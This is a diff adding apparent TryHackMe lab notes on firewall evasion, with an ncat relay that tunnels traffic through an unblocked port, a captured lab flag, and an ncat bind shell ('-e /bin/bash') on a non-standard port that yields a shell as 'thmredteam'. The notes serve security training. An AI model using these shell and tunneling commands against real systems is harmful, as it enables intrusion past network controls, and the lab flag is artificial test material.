@@ -68,4 +68,26 @@ Evasion via Forcing Fragmentation, MTU, Data Length
 
 -----------------------------------------------------------------------------------------------------
 
+Port Tunneling
+
+if a server is behind firewall but if the firewall does not block specific ports, those ports can be used to tunnel traffic and avoid firewall
+
+-go to address
+http:/[serverIP]:8080
+
+-enter command
+ncat -lvnp 8008 -c "ncat localhost 80"
+THM{1298331956}
+
+-----------------------------------------------------------------
+
+Evasion using non-standard ports
+
+ncat -lvnp 8081 -e /bin/bash
+
+-attackbox
+ncat [MachineIP] [Port]
+
+whoami
+thmredteam
 
